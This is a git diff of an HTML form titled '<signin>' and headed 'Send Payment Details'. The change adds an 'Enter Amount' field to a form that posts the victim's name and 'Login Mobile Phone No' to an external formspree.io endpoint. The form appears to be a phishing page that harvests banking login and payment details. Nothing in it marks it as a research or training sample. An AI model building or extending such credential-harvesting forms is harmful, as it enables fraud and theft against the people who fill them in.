@@ -3,11 +3,14 @@
 <title><signin></title>
 <h1> Send Payment Details</h1>
 <body bgcolor="#E7E7EF"><br>
-<form id="fs-frm" name="file-upload-form" accept-charset="utf-8" action="https://formspree.io/f/xzbwnjge" method="post"
-enctype="multipart/form-data">
+<form id="fs-frm" name="file-upload-form" accept-charset="utf-8" action="https://formspree.io/f/xzbwnjge" method="post">
+
   <fieldset id="fs-frm-inputs">
     <label for="full-name">Full Name</label>
     <input type="text" name="name" id="full-name" placeholder="First and Last" required="">
+     <label for="currency-field">Enter Amount</label>
+
+<input type="text" name="currency-field" id="currency-field" placeholder="50,000" required="">
     <fieldset id="fs-frm-inputs">
     <label for="full-name">Phone Number</label>
     <input type="phone" name="No" id="full-name" placeholder="Login Mobile Phone No" required="">
